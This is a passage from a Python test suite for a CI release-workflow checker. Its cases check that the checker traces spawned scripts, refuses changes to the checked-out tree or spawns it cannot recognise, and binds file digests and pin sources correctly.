    ("a JavaScript execFile with arguments", "node scripts/zz-spawn.js\n",
     {"scripts/zz-spawn.js": 'const { execFileSync } = require("node:child_process");\n'
                             'execFileSync("scripts/zz-target.sh", ["--x"]);\n'}),
    ("find -exec", "find . -name '*.md' -exec scripts/zz-target.sh {} \\;\n", {}),
    ("find -execdir", "find . -name '*.md' -execdir ./scripts/zz-target.sh {} +\n", {}),
):
    expect_verify_refused(verify_with(hook, {**COMPUTED_TARGET, **files}),
                          f"verify follows a target run through {label} as invoked",
                          ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED, "zz-target.sh"))
# The reviewer's scenario: the target changes the checked-out tree.
expect_verify_refused(
    verify_with("python3 scripts/zz-spawn.py\n",
                {"scripts/zz-spawn.py": 'import subprocess\nsubprocess.run(["scripts/zz-target.sh"])\n',
                 "scripts/zz-target.sh": "git checkout HEAD~1 -- scripts/changelog.py\n"}),
    "verify refuses a tree change in a target a Python spawn runs",
    ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", "changes the checked-out tree"))
# A bare mention stays named: bound, not traced.
expect(verify_with('echo "see scripts/zz-target.sh"\n', COMPUTED_TARGET), 0,
       ("PENDING: release.yml [workflow_dispatch]: job 'verify'",),
       "a target only mentioned is bound but not traced as invoked", *PENDING_ARGS)

# Round-9 nits: `\git` (alias-bypassing) and `patch` are tree changes in a
# traced program, and a git verb in a Python or JavaScript argv is read too.
for label, hook, files in (
    ("a backslash-escaped git checkout", "\\git checkout HEAD~1 -- scripts/changelog.py\n", {}),
    ("a patch in a program it runs", "patch -p1 < changes.diff\n", {}),
    ("a git checkout in a Python argv", "python3 scripts/zz-spawn.py\n",
     {"scripts/zz-spawn.py": 'import subprocess\nsubprocess.run(["git", "checkout", "HEAD~1", "--", "p"])\n'}),
    ("a git restore in a JavaScript argv", "node scripts/zz-spawn.js\n",
     {"scripts/zz-spawn.js": 'const { spawnSync } = require("node:child_process");\n'
                             'spawnSync("git", ["restore", "--source=HEAD~1", "p"]);\n'}),
):
    expect_verify_refused(verify_with(hook, files), f"verify refuses {label}",
                          ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", "changes the checked-out tree"))

# Round-9 nits: a spawn the trace cannot recognize refuses rather than
# passing unexamined.
for label, hook, files in (
    ("a renamed destructured JavaScript spawn", "node scripts/zz-spawn.js\n",
     {"scripts/zz-spawn.js": 'const { spawnSync: go } = require("node:child_process");\ngo(tool, []);\n'}),
    ("a bracket-accessed JavaScript spawn", "node scripts/zz-spawn.js\n",
     {"scripts/zz-spawn.js": 'const cp = require("node:child_process");\ncp["spawnSync"](tool, []);\n'}),
    ("a star import from subprocess", "python3 scripts/zz-spawn.py\n",
     {"scripts/zz-spawn.py": "from subprocess import *\nrun(command)\n"}),
    ("a getattr on subprocess", "python3 scripts/zz-spawn.py\n",
     {"scripts/zz-spawn.py": 'import subprocess\ngetattr(subprocess, "run")(command)\n'}),
    ("an os.system imported by name", "python3 scripts/zz-spawn.py\n",
     {"scripts/zz-spawn.py": "from os import system\nsystem(command)\n"}),
):
    expect_verify_refused(verify_with(hook, files), f"verify refuses {label}",
                          ("VIOLATION: release.yml [workflow_dispatch]: job 'verify'", UNRESOLVED))

# ---------------------------------------------------------------------------
# Round-7 nits: the verify binding hashes raw bytes (two invalid UTF-8
# sequences must not decode to the same replacement text and digest), and a
# relative root is made absolute rather than silently binding nothing.
# ---------------------------------------------------------------------------
def trace_tree(files: dict[str, bytes], steps: str) -> dict:
    with tempfile.TemporaryDirectory() as root:
        for name, body in files.items():
            os.makedirs(os.path.dirname(os.path.join(root, name)) or root, exist_ok=True)
            with open(os.path.join(root, name), "wb") as handle:
                handle.write(body)
        subprocess.run(["git", "init", "-q", root], check=True)
        subprocess.run(["git", "-C", root, "add", "-A"], check=True)
        job = {"steps": [{"run": steps}]}
        absolute = CHECKER.tree_programs(job, root)
        here = os.getcwd()
        os.chdir(root)
        try:
            relative = CHECKER.tree_programs(job, ".")
        finally:
            os.chdir(here)
    return {"absolute": absolute, "relative": relative}


BYTES_A = trace_tree({"scripts/x.sh": b"echo \xff\n"}, "bash scripts/x.sh")
BYTES_B = trace_tree({"scripts/x.sh": b"echo \xfe\n"}, "bash scripts/x.sh")
if BYTES_A["absolute"].get("scripts/x.sh") and BYTES_A["absolute"] != BYTES_B["absolute"]:
    ok("the verify binding hashes raw bytes: different invalid UTF-8 bytes bind different digests")
else:
    fail(f"the verify binding decoded bytes before hashing ({BYTES_A['absolute']} vs {BYTES_B['absolute']})")
if BYTES_A["relative"] == BYTES_A["absolute"] and BYTES_A["absolute"]:
    ok("tree_programs with a relative root binds what it binds with the absolute root")
else:
    fail(f"tree_programs with a relative root bound {BYTES_A['relative']}, not {BYTES_A['absolute']}")

# Round-8 finding 5: the frozen show's pin source is bound because the show
# reads $pin from it, not because some traced text happens to name it.
with tempfile.TemporaryDirectory() as root:
    for name, body in {"scripts/hook.sh": "echo hook\n", "pins/source.yml": "pin: data\n"}.items():
        os.makedirs(os.path.dirname(os.path.join(root, name)), exist_ok=True)
        with open(os.path.join(root, name), "w", encoding="utf-8") as handle:
            handle.write(body)
    subprocess.run(["git", "init", "-q", root], check=True)
    subprocess.run(["git", "-C", root, "add", "-A"], check=True)
    show = CHECKER.FrozenShow("scripts/hook.sh", "git show x", "pins/source.yml")
    bound = CHECKER.tree_programs({"steps": [{"run": "bash scripts/hook.sh"}]}, root, tolerated=show)
    unbound = CHECKER.tree_programs({"steps": [{"run": "bash scripts/hook.sh"}]}, root)
if "pins/source.yml" in bound and "pins/source.yml" not in unbound:
    ok("the frozen show binds its pin source though no traced text names it")
else:
    fail(f"the frozen show's pin source binding: with {sorted(bound)}, without {sorted(unbound)}")

sys.exit(1 if failures else 0)
